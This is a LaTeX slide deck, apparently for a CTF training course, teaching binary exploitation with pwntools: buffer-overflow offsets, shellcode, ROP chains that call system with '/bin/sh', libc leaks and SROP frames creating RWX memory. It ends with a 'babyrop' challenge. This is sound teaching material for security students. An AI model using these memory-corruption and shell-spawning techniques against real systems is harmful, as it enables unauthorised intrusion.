\documentclass[aspectratio=169]{beamer}


\usepackage{../theme/polygl0ts}
%prevents cleaning up the cache at the end of the run (needed to keep the unused caches, generated by other editions)
\makeatletter
\renewcommand*{\minted@cleancache}{}
\makeatother


\makeatletter
\def\minted@jobname{lesson2}
\makeatother

\usepackage{drawstack}
\usepackage{pgfpages}

%\setbeameroption{show notes on second screen}

\tikzstyle{freecell}=[fill=none]

\newcommand{\reg}[1]{\%\mintinline{asm}{#1}}
\newcommand{\hex}[1]{\mintinline{python}{0x#1}}
\newcommand{\naddr}[2]{\begin{tabular}{l}#1\\\hex{#2}\end{tabular}}
\newcommand{\docl}[1]{(\textbf{\href{#1}{Documentation}})}

\hypersetup{colorlinks,linkcolor=,urlcolor=brightblue}

\setbeamertemplate{navigation symbols}{}

\showsectionframe

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% Title Setup
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\title{Sploiting 101}
\subtitle{Gonna pwn 'em all!}
%\author{Leonardo Galli}
\date{\today}

\begin{document}
\titleframe

%\tocframe


{
\hidesectionframe
\showsubsectionframe

\section{pwntools}
\subsection{Basics}
\begin{frame}[fragile]
    \frametitle{What is pwntools?}
    \begin{itemize}
        \item it's your best friend during ctfs
        \item it's for pwning (popping shells left and right)
		\item Loads of features!
		\item Mostly undocumented
	\end{itemize}
	\vspace{1em}
	If you don't have it installed yet, install it *now* with:\\
	\inlinecode[bash]{pip3 install pwn --user}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Basic Script \docl{http://docs.pwntools.com/en/stable/commandline.html\#pwn-template}}
    Generate a template by running: 
    \begin{codebox}{bash}
pwn template # summary of template

pwn template <binary> > sploit.py # save it to file

pwn template <binary> --host epfl.ch --port 80\end{codebox}

\end{frame}
\begin{frame}[fragile]

    \begin{codebox}{python}
def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io\end{codebox}
\begin{itemize}
    \item start binary locally or connect to remote
    \item attach gdb if \inlinecode[bash]{GDB} specified on command line
    \item additional arguments passed along, see \href{http://docs.pwntools.com/en/stable/tubes/processes.html#pwnlib.tubes.process.process}{\texttt{process}} and \href{http://docs.pwntools.com/en/stable/tubes/sockets.html#pwnlib.tubes.remote.remote}{\texttt{connect} (alias for \texttt{remote})} for details on these.
\end{itemize}
\note{
These two functions are used to either start the binary locally or connect to the remote server.
For both, any additional arguments you provide will be passed along to the pwntools functions.
Usually, however, you should not need to pass more arguments.
In either case, if you have GDB as an argument when starting this script, it will also automatically attach gdb to the binary
(On the remote host, this will of course not work).
}

\end{frame}
\begin{frame}[fragile]

\begin{codebox}{python}
def start(argv=[], *a, **kw):
if args.LOCAL:
    return local(argv, *a, **kw)
else:
    return remote(argv, *a, **kw)\end{codebox}
\begin{itemize}
    \item decides whether to connect to remote or start binary locally
    \item controlled by specifying \inlinecode[bash]{LOCAL} on command line
    \item can add more arguments with argv
    \item additional arguments passed along
\end{itemize}
\note{
    This function is responsible for deciding whether to connect remotely or start the binary locally (by specifying LOCAL on the command line).
    Useful to quickly switch between the two, especially if you are not entirely sure whether an exploit will work on the server.
    But, you can still always manually run the binary locally, for example to find an offset (see reference exploit for last weeks challenge).
    Since additional arguments are passed along, you can then easily control e.g. process.
}

\end{frame}
\begin{frame}[fragile]

% TODO: maybe use f-strings instead of ".format(**locals())"?
\begin{codebox}{python}
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()\end{codebox}
\begin{itemize}
    \item setup gdbscript (gdb commands run on attach)
    \item call \inlinecode[python]{start}, which creates a \inlinecode[python]{tube} object
    \item \inlinecode[python]{tube} is used to ``communicate'' with the process / remote server
    \item ready to write the exploit now
\end{itemize}
\note{
    Finally, we set our gdbscript (gdb commands that will be run when we connect with gdb) and then create a so-called ``tube'' object.
    This will be explained later, but is basically your interface for communicating with the process or remote server
}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Context \docl{http://docs.pwntools.com/en/stable/context.html}}
    \begin{itemize}
        \item pwntools uses global variable context to control many settings
        \item shouldn't need to change any, except maybe \inlinecode[python]{context.terminal}
        \begin{itemize}
            \item set to string with path to your terminal
            \item if you need to provide arguments to your terminal, set to array: \inlinecode[python]{["/path/to/terminal", "arg1", "--flag", "value"]}
        \end{itemize}
        \item by setting \inlinecode[python]{context.binary}, most other settings are automatically inferred
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Packing / Unpacking \docl{http://docs.pwntools.com/en/stable/util/packing.html}}
    \begin{itemize}
        \item used for converting between numbers and strings
        \item convert number into string (\textit{pack}) with \inlinecode[python]{pX(0x100)}, where \texttt X is the number of bits the resulting string should have (8, 16, 32, and 64 are valid)
        \item automatically uses correct endianness (if \inlinecode[python]{context.binary} was set)
        \item convert string into number (\textit{unpack}) with \inlinecode[python]{uX(b"\x01\x00")}
    \end{itemize}
\end{frame}
\begin{frame}[fragile]
    \frametitle{Packing -- Continued \docl{http://docs.pwntools.com/en/stable/util/packing.html}}
    \begin{itemize}
    \item create a payload with \inlinecode[python]{fit} (alias for \inlinecode[python]{flat})
    \item pass either array of values (can either be strings directly, or numbers) or dictionary
    \item keys in dictionary are relative offsets specifying where to place corresponding values
    \item arguments can be arbitrarily nested
    \item any bytes that are not specified will be filled with data from \inlinecode[python]{cyclic}
    \item Example, produces \inlinecode[python]{"\xfe\x00\x00\x00baaaasdf"}:
            \begin{codebox}{python}
fit({
    0: 0xfe, # packed as 4-byte little-endian integer (uses context)
    4: { # offset by 4 from start
        4: "asdf" #Â offset by 4 from start of this dictionary,
        # so offset by 8 from absolute start.
        # anything not specified (e.g. bytes 4-7) will be filled
    }
})\end{codebox}
    \end{itemize} 

\end{frame}

\begin{frame}[fragile]
    \frametitle{cyclic \docl{http://docs.pwntools.com/en/stable/util/cyclic.html}}
    \begin{itemize}
        \item use \inlinecode[python]{cyclic(128)} to create a string of length 128 whose subsequences are all unique
        \item useful to identify how many bytes you need to overflow
        \item for example, if \inlinecode[bash]{echo "ABCDEFGH" | ./vuln} crashes at \hex{48474645}, 4 bytes of overflow before saved \reg{rip}
        \item use with \inlinecode[python]{cyclic_find(0x48474645)} to identify offset in string returned by \inlinecode[python]{cyclic} (use with corefile explained later)
        \item Example:
        \begin{codebox}{python}
io.send(cyclic(128)) # segfault at 0x61616164616161
offset = cyclic_find(0x61616164616161) # offset = 9
io.send("A"*offset + payload) # next run, use offset\end{codebox}
    \end{itemize}
% TODO: mention standalone cyclic command-line tool?
\end{frame}

\begin{frame}[fragile]
	\frametitle{Sploiting automation}
	\begin{codebox}{python}
io = start()
io.send(cyclic(200, n=8))
io.shutdown()
io.wait()

# echo 1 | sudo tee /proc/sys/kernel/core_uses_pid
# echo "/tmp/core" | sudo tee /proc/sys/kernel/core_pattern
# echo 0 | sudo tee /proc/sys/kernel/core_uses_pid
core = Coredump("/tmp/core")
offset = cyclic_find(p64(core.fault_addr), n=8)

io = start()
payload = fit({ offset: exe.symbols.win })
io.send(payload)
io.interactive()\end{codebox}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Logging and Pausing \docl{http://docs.pwntools.com/en/stable/log.html}}
    \begin{itemize}
        \item Not recommended to use print statements, has caused me issues in the past
        \item use \inlinecode[python]{log} for a ready-to-use, nice-looking logger
        \item different levels with \inlinecode[python]{log.debug, log.info, log.warn, log.error} (debug is off by default, enabled when \inlinecode[bash]{DEBUG} is on command line)
        \item works like \texttt{printf} for formatting, for example:
        \begin{itemize}
            \item \inlinecode[python]{log.info("Leaked address 0x%x", my_address_as_a_number)}: \inlinecode[python]{[+] Leaked address 0x7ff0123998}
            \item \inlinecode[python]{log.warn("Got flag: %s", flag)}: \inlinecode[python]{[!] Got flag: b'flagbot{hello_there}'}
        \end{itemize}
        \item use \inlinecode[python]{pause(n = None)} to make the script pause for \inlinecode[python]{n} seconds or until key pressed (indefinitely if no argument provided)
        \begin{itemize}
            \item useful for manually attaching something, e.g. \texttt{strace}
        \end{itemize}
    \end{itemize} 
\end{frame}

\begin{frame}[fragile]
	\frametitle{Corefile \docl{http://docs.pwntools.com/en/stable/elf/corefile.html}}
	\begin{itemize}
		\item coredumps are generated by the os when something goes wrong
		\item enable them temporarily with \inlinecode[bash]{echo "core" | sudo tee /proc/sys/kernel/core_pattern} and \inlinecode[bash]{ulimit -c unlimited}
		\item can be loaded in pwntools with \inlinecode[python]{core = Coredump('./core')}
		\item gives you access to the registers \inlinecode[python]{core.registers} and e.g. faulting address \inlinecode[python]{core.fault_addr} when crash occurred
		\item use in combination with cyclic to automatically determine buffer overflow offset:
	\end{itemize}
	\begin{codebox}{python}
io.sendline(cyclic(128))
io.wait() # wait on crash

core = Coredump('./core')
offset = cyclic_find(core.fault_addr)
# offset is how many bytes till you start overwriting saved rip\end{codebox}
\end{frame}

\subsection{Tubes}

\begin{frame}[fragile]
    \frametitle{Tube Basics \docl{http://docs.pwntools.com/en/stable/tubes.html}}
    \begin{itemize}
        \item generic interface to talk to remote server or local binary
        \item buffers input and output, which can sometimes lead to issues
    \end{itemize}
    \begin{alertblock}{bytes vs. str}
        Usually, pwntools functions accept both \inlinecode[python]{bytes} and \inlinecode[python]{str} as arguments.
        However, most functions return \inlinecode[python]{bytes}, which you cannot easily concatenate with a string.
        Hence, it is recommended to always work with bytes. This mostly entails writing string literals as \inlinecode[python]{b"Hello bytes"}, instead of \inlinecode[python]{"Hello str"}.
    \end{alertblock}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Tube Reading \docl{http://docs.pwntools.com/en/stable/tubes.html\#pwnlib.tubes.tube.tube.recv}}
    \begin{onlyenv}<1>
        \begin{itemize}
            \item \inlinecode[python]{recvall()}: receives until EOF reached
            \item \inlinecode[python]{recv(numb = 4096)}: receives up to \inlinecode[python]{numb} bytes and returns as soon as anything is available
            \item \inlinecode[python]{recvb(numb)}: receives exactly \inlinecode[python]{numb} bytes
            \item \inlinecode[python]{recvpred(pred)}: receives until \inlinecode[python]{pred(all_bytes)} is true
            \item \inlinecode[python]{recvregex(regex)}: receives until \inlinecode[python]{regex} matches any part of the bytes
            \item \inlinecode[python]{recvuntil(delims)}: receive until one of \inlinecode[python]{delims} is found
            \begin{itemize}
                \item used very often, for example to read until there is a prompt
            \end{itemize}
        \end{itemize}
    \end{onlyenv}
    \begin{onlyenv}<2>
        \begin{itemize}
            \item \inlinecode[python]{recvline()}: receives until first newline encountered, returns bytes including newline
            \item \inlinecode[python]{recvlines(num)}: receives up to \inlinecode[python]{num} lines and rurns them in an array
            \item \inlinecode[python]{recvline_name()}:
            \begin{itemize}
                \item \inlinecode[python]{name} is any of \inlinecode[python]{pred, regex, startswith, endswith, contains}
                \item \inlinecode[python]{pred, regex} works like with the equivalent \inlinecode[python]{recv} calls
                \item \inlinecode[python]{startswith, endswith, contains} receive until a line matches
            \end{itemize}
        \end{itemize}
    \end{onlyenv}
    \begin{onlyenv}<3>
        \begin{itemize}
            \item all functions accept optional timeout parameter
            \item if set, function will return \inlinecode[python]{b""} after that many seconds
            \item all functions also have an alias, with \inlinecode[python]{recv} replaced by \inlinecode[python]{read}
        \end{itemize}
    \end{onlyenv}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Tube Writing \docl{http://docs.pwntools.com/en/stable/tubes.html\#pwnlib.tubes.tube.tube.send}}
    \begin{itemize}
        \item \inlinecode[python]{send(data)}: sends data
        \item \inlinecode[python]{sendafter(delim, data)}: combination of \inlinecode[python]{recvuntil(delim)} and \inlinecode[python]{send(data)}, returns received data
        \item \inlinecode[python]{sendthen(delim, data)}: combination of \inlinecode[python]{send(data)} and \inlinecode[python]{recvuntil(delim)}, returns received data
        \begin{itemize}
            \item very useful, often you send some data and wait on a response
        \end{itemize}
        \item \inlinecode[python]{sendline(data)}: send data and add a newline at the end
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Tube Misc}
    \begin{itemize}
        \item \inlinecode[python]{interactive()}: opens an interactive prompt, useful after you got shell
        \begin{itemize}
            \item can safely use [ctrl-c] to terminate the function and continue with your script
            \item useful to manually enter some information (e.g. proof of work)
        \end{itemize}
        \item \inlinecode[python]{stream()}: like interactive, but just streams everything to stdout
        \item \inlinecode[python]{shutdown()}: closes the sending side of the tube
        \begin{itemize}
            \item useful in some cases, e.g. when you want to send an EOF, without completely closing the tube and thus loosing the ability to receive data
        \end{itemize}
    \end{itemize}
    \note{
        \begin{itemize}
            \item interactive: sends whatever you type (on enter) and prints whatever you receive
            \item shutdown: IIRC can be called multiple times, for e.g. multiple read calls with exact return value
        \end{itemize}
    }
\end{frame}

\begin{frame}[fragile]
    \frametitle{Tube Example}
    \begin{codebox}{python}
log.info("Menu: %s", io.recvuntil("> "))
# [+] Menu: Welcome to Note Keeper 1.0
# 1) Add Note
# 2) Read Note
# 3) Delete Note
# > 
log.info(io.sendlinethen("Contents: ", "1"))
# [+] Note Contents: 
log.info(io.sendlinethen("> ", "Hello World"))
# [+] Added Note at index 0
# 1) ... (menu again)
log.info(io.sendlinethen("Index: ", "2"))
# [+] Index: 
log.info(io.sendlinethen("> ", "0"))
# [+] Note 0: Hello World
# 1) ... (menu again)\end{codebox}
\end{frame}

\subsection{Working with Binaries}
\begin{frame}[fragile]
    \frametitle{ELF \docl{http://docs.pwntools.com/en/stable/elf/elf.html\#module-pwnlib.elf.elf}}
    \begin{itemize}
        \item get various information from an ELF file (executable file on linux)
        \item extract address of functions, variables, etc. with \inlinecode[python]{exe.symbols}
        \begin{itemize}
            \item can be accessed as a dictionary or just dot syntax \inlinecode[python]{exe.symbols.main == exe.symbols["main"]}
            \item GOT and PLT can be accessed via \inlinecode[python]{exe.got} and \inlinecode[python]{exe.plt} respectively
        \end{itemize}
        \item get offset into BSS with \inlinecode[python]{exe.bss(offset)}
        \begin{itemize}
            \item useful if you need a place to store data, but make sure to use an offset of at least \hex{20}
            \item usually, binaries store information about stdin/stdout at the start of BSS!
        \end{itemize}
        \item all functions from packing / unpacking are available to call on an ELF
        \begin{itemize}
            \item first argument now, is starting address though
            \item useful to read / write numbers at a certain address
        \end{itemize}
    \end{itemize}

\end{frame}
\begin{frame}[fragile]
    \frametitle{Example with Leaking}
    \begin{itemize}
        \item set \inlinecode[python]{address} to change the base address where it is loaded
        \item useful with an info leak and you want a symbol location, for example:
    \end{itemize}
    \begin{codebox}{python}
libc = exe.libc
# ... (exploit that leads to info leak)
leak = io.recvn(8)
printf_leaked = u64(leak)
log.info("Leaked address of printf: 0x%x", printf_leaked)
libc.address = printf_leaked - libc.symbols.printf # calculate base
system_addr = libc.symbols.system
log.info("system is at 0x%x", system_addr)
# ... (run exploit to call system_addr)\end{codebox}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Sploiting automation 2}
	\begin{codebox}{python}
# ... from before
rop = ROP(exe)
rop.gets(exe.bss(0x20))
rop.system(exe.bss(0x20))
log.info("BSS at 0x%x", exe.bss())
print(rop.dump())

payload = fit({ 0: b"\xf4", offset: rop.chain() })
log.info("Payload: %s", payload)
io = start()
io.sendline(payload)
io.sendline(b"/bin/sh\0")
io.interactive()\end{codebox}

\end{frame}


\subsection{Shellcoding}
\begin{frame}
    \frametitle{What is Shellcode?}
    \begin{itemize}
        \item small piece of - usually - handwritten assembly code
        \item often used for getting a shell more easily
        \item write final assembled machine code into executable area, then make execution jump to there
        \begin{itemize}
            \item works well if you already have a writable and executable section (not often anymore)
            \item otherwise, you first have to change protection yourself before executing
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Shellcraft \docl{http://docs.pwntools.com/en/stable/shellcraft/amd64.html}}
    \begin{itemize}
        \item assembly is written in intel syntax
        \item shellcraft is pwntools module containing functions that are used a lot
        \item functions all return a string of assembly code
        \item call them with \inlinecode[python]{shellcraft.func()} for the default architecture or \inlinecode[python]{shellcraft.amd64.func()} for a specific one
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Useful Shellcraft Functions \docl{http://docs.pwntools.com/en/stable/shellcraft/amd64.html}}
    \begin{itemize}
        \item \inlinecode[python]{echo(string)}: write string to stdout, useful for debugging (or outputting flag)
        \item \inlinecode[python]{syscall(num, ...)}: execute syscall num, arguments can also be C constants (e.g. \inlinecode[python]{'SYS_read', 'PROT_WRITE'}) or registers (e.g. \inlinecode[python]{'rsp', 'eax'})
        \item \inlinecode[python]{pushstr(string, append_null=True)}: pushes string onto the stack without using null bytes or newlines
        \begin{itemize}
            \item extremely useful, don't have to worry about your input being cutoff
        \end{itemize}
        \item \inlinecode[python]{sh()}: gives you a shell
    \end{itemize}
    \begin{alertblock}{\textbf{shellcraft.sh()}}
        This function ensures all parameters of the execve syscall are set correctly and pushes \inlinecode[python]{"/bin/sh"} onto the stack.
        While this is nice, it uses a lot of bytes for all of this.
        Hence, for some challenges, you are better of writing your own trimmed down version.
    \end{alertblock}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Shellcraft Example}
    \begin{columns}
        \begin{column}{0.5\textwidth}
            \begin{codebox}{python}
s = "Hello from syscall!"
sc = shellcraft.pushstr(s)
# rsp points to start of s on stack
sc += shellcraft.syscall("SYS_write",
    1, "rsp", len(s)+1)
log.info("Shellcode: %s", sc)
# [+] Shellcode: /* push 'Hell ... \end{codebox}
        \end{column}
        \begin{column}{0.5\textwidth}
            \begin{codebox}{asm}
/* push 'Hello from syscall!\x00' */
push 0x1010101 ^ 0x216c6c
xor dword ptr [rsp], 0x1010101
mov rax, 0x6163737973206d6f
push rax
mov rax, 0x7266206f6c6c6548
push rax
/* call write(1, 'rsp', 20) */
push SYS_write /* 1 */
pop rax
push 1
pop rdi
push 0x14
pop rdx
mov rsi, rsp
syscall\end{codebox}
        \end{column}
        \end{columns}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Assembling Shellcode \docl{http://docs.pwntools.com/en/stable/asm.html}}
    \begin{itemize}
        \item use \inlinecode[python]{asm('mov eax, 0')} to turn any assembly into bytes of machine code
        \item architecture and os either through context or arch and os keyword arguments
        \item usually use combination of shellcraft functions and custom assembly
        \item labels work as well, example:
    \end{itemize}
    \begin{codebox}{python}
# reuse sc from before
sc += """
.loop: /* infinite loop */
    jmp .loop 
"""
asc = asm(sc)
log.info("Assembled: %s", asc)
# [+] Assembled: b'hmm \x01\x814\x01\x01\x01\x01H\xb8om syscaPH\xb8He...'\end{codebox}
\end{frame}

\subsection{ROP}
\begin{frame}
    \frametitle{ROPing can be cumbersome}
    \begin{itemize}
        \item if there is no win function, we must find gadgets to set arguments for other functions
        \item in the most extreme case, need to manually make syscalls for reading, writing, etc.
        \begin{itemize}
            \item happens, if no useful functions from libc are imported and we do not have a leak
        \end{itemize}
        \item pwntools can automate a lot for us!
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{ROP \docl{http://docs.pwntools.com/en/stable/rop/rop.html}}    
    \begin{itemize}
        \item initialize with \inlinecode[python]{rop = ROP(exe, base=stack_addr)} (only specify base if known)
        \item add calls to our chain with \inlinecode[python]{rop.call(name_or_addr, ...)}
        \begin{itemize}
            \item arguments can also be register names, e.g. 'rsp'
            \item can also directly use \inlinecode[python]{rop.name(...)}, e.g. \inlinecode[python]{rop.read(0, exe.bss(), 0x20)}
            \item possible to call syscalls not in binary, e.g. above example even if no read function in binary (pwntools automatically tries an SROP)
        \end{itemize}
        \item inspect chain with \inlinecode[python]{rop.dump()}
        \item convert chain to bytes with \inlinecode[python]{rop.chain()}
        \item \textbf{Note:} add enough characters in front of \inlinecode[python]{rop.chain()}, such that the first byte of \inlinecode[python]{rop.chain()} overwrites first byte of saved \reg{rip}
    \end{itemize}
    \note{
        stack_addr is the address of the first byte of our rop chain!

        rop.chain() return value is ready to send via tube
    }
\end{frame}

\begin{frame}[fragile]
    \frametitle{Example ROP}
\begin{codebox}{python}
rop = ROP(exe)
rop.gets(exe.bss(0x20))
rop.system(exe.bss(0x20))
log.info("Chain: %s", rop.dump())
# [+] Chain: 0x0000:         0x40131b pop rdi; ret
# 0x0008:         0x4040a0 [arg0] rdi = stderr
# 0x0010:         0x401060 gets
# 0x0018:         0x40131b pop rdi; ret
# 0x0020:         0x4040a0 [arg0] rdi = stderr
# 0x0028:         0x401040 system
\end{codebox}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Sigreturn Oriented Programming \docl{http://docs.pwntools.com/en/stable/rop/srop.html}}
    \begin{itemize}
        \item What can we do, if we only control the \reg{rax} register and nothing else?
        \item The only option is a syscall, but which one?
    \end{itemize}
    \begin{alertblock}{\textbf{rt\_sigreturn}}
        Intended to be used at the end of a signal handler. Kernel saves registers of when signal occurred on stack.
        When \inlinecode[asm]{rt_sigreturn} is called, all registers are restored by the kernel.\\
        We can abuse this, to set every register (including \reg{rip})!\\~\\
        \textbf{Limitation:} Every register - including \reg{rsp} - needs to be set!
        Hence, we need to make sure, \reg{rsp} points to something useful and ideally more ret gadgets.
    \end{alertblock}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Sigreturn Oriented Programming (SROP) \docl{http://docs.pwntools.com/en/stable/rop/srop.html}}
    \begin{itemize}
        \item create a new frame with \inlinecode[python]{frame = SigreturnFrame()}
        \item populate its registers, e.g. \inlinecode[python]{frame.rax = 0x1}
        \begin{itemize}
            \item usually you want to use this for a syscall
            \item therefore, you want to set \reg{rax} to the syscall number and \reg{rip} to a gadget containing \inlinecode[asm]{syscall; ret} (see \href{https://filippo.io/linux-syscall-table/}{syscall table} for syscalls and their arguments)
            \item often you want to use \inlinecode[asm]{mmap} (create new memory) or \inlinecode[asm]{mprotect} (change memory permissions)
            \item allows you to easily shellcode
        \end{itemize}
        \item add it to your rop: \inlinecode[python]{rop.raw(frame)}
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Example SROP}
\begin{codebox}{python}
# setup rop, so that rax = constants.SYS_rt_sigreturn before here
rop.call(syscall_ret_gadget) # execute rt_sigreturn
frame = SigreturnFrame() # frame to create RWX memory
frame.rax = constants.SYS_mmap
frame.rdi = 0x100000 # address
frame.rsi = 0x1000 # size
frame.rdx = constants.eval("PROT_READ | PROT_WRITE | PROT_EXEC") # RWX
frame.rip = syscall_ret_gadget
frame.rsp = 0x100000 # does not work here!
rop.raw(frame)
log.info("Chain: %s", rop.dump())
# [+] Chain: 0x0000:         0x400000 0x400000()
# 0x0008:              0xf SYS_rt_sigreturn
# 0x0010:         0x400010 0x400010()
# 0x0018:              0x0 uc_flags # start of frame
# ...
# 0x0108:              0x0 sigmask # end of frame\end{codebox}
\end{frame}

}

\section{ropper}
\begin{frame}[fragile]
    \frametitle{ropper \docl{https://github.com/sashs/Ropper\#usage}}
    \begin{itemize}
        \item pwntools often fails at finding gadgets
        \item ropper can help, provides a nice overview of all gadgets
        \item can also search specific gadgets for you
        \item preinstalled on the virtual machines
        \item run \inlinecode[bash]{ropper -f program} to dump a list of found gadgets
    \end{itemize}
\end{frame}

\section{ropium}
\begin{frame}[fragile]
    \frametitle{ropium \docl{https://github.com/Boyan-MILANOV/ropium\#getting-started}}
    \begin{itemize}
        \item does not have a nice list of gadgets
        \item however, finds arbitrary chains of gadgets for you
        \begin{itemize}
            \item for example, we want to set \reg{rax} = \hex{10}
            \item it finds gadget for setting \reg{rbx}: \inlinecode[asm]{pop rbx; ret}
            \item then finds gadget for setting \reg{rax} = \reg{rbx}: \inlinecode[asm]{mov rax, rbx; ret}
        \end{itemize}
        \item will be installed on virtual machines, if you update them
    \end{itemize}

\end{frame}

\section{Further Readings}
\begin{frame}[fragile]
    \frametitle{More pwntools}
    \begin{itemize}
        \item \href{https://github.com/Gallopsled/pwntools-tutorial}{pwntools Tutorials}
        \item \href{http://docs.pwntools.com/en/stable/util/hashes.html}{Hashes with pwntools}
        \item \href{http://docs.pwntools.com/en/stable/util/fiddling.html}{Bit Fiddeling} (xor, base64, bits, etc.)
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Challenge}
    {
        \begin{alertblock}{\textbf{babyrop}}
            Oh no! Our fibonacci calculator is getting exploited, can you figure out how?
            I heard it had something to do with negative numbers...\\
            \textbf{Hints:} This binary has only readable memory, so you probably want to remove that limit ;)
            You will probably have to use a sigreturn frame for this, since there are not enough gadgets for all registers.
            Also, setting \reg{rax} is gonna require some effort :)\\
            \textbf{Files:} \href{https://flagbot.ch/babyrop.zip}{babyrop.zip}\\
            \textbf{Server:} google.jadoulr.tk 42001\\
            \textbf{Author:} Robin Jadoul
        \end{alertblock}
    }
\end{frame}
\end{document}
